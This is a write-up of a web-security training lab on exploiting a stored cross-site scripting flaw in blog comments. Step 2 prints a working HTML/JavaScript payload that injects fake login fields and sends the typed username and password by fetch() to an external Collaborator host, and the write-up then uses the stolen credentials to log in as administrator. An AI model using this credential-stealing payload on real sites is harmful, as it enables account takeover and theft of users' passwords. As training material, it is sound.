# Lab: Exploiting cross-site scripting to capture passwords

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

**NOTE**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.*

*Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.*

# Step 1 Find XSS vuln in comments function:

Adding a POC payload into a blog-post comment:

![image](https://user-images.githubusercontent.com/83407557/210614348-97de9160-9930-4c86-bfea-04c84d9521cc.png)

When I go back and view my comment, the page tries to print, verifying XSS:

![image](https://user-images.githubusercontent.com/83407557/210614535-9b0d9049-b482-451b-9375-3cc82d9e31b4.png)

# Step 2 Create a password stealing XSS payload

First I need to grab my collaborator's URL:

![image](https://user-images.githubusercontent.com/83407557/210614710-a6c10114-64e1-452b-a59d-bb52087ad3b4.png)

`c3gtx1iww0cl1k1q6psn1ue43v9mxel3.oastify.com`

Then I craft an XSS payload with this URL:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('c3gtx1iww0cl1k1q6psn1ue43v9mxel3.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

# Step 3 use payload in a comment

![image](https://user-images.githubusercontent.com/83407557/210622864-cd81f60d-2a5c-4669-87f0-65a4e901fb36.png)

# Step 4 poll collaborator

(Note, I had to restart the lab, but followed all the previous steps, new collaborator url= evdx8bp7ct0rnopijvg0b0wyyp4gs7gw.oastify.com). I see that my server got a POST request containing the username and password:

![image](https://user-images.githubusercontent.com/83407557/211015988-83b77bb8-3b9e-4b4f-a114-07c2e7d022fe.png)

# Step 5 login as administrator

With these creds I can login as admin:

![image](https://user-images.githubusercontent.com/83407557/211016155-48cce2a2-6362-4e03-a956-cd6acc311f7f.png)


Which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/211016235-90678fac-22b6-4a13-9909-d2c655eae552.png)


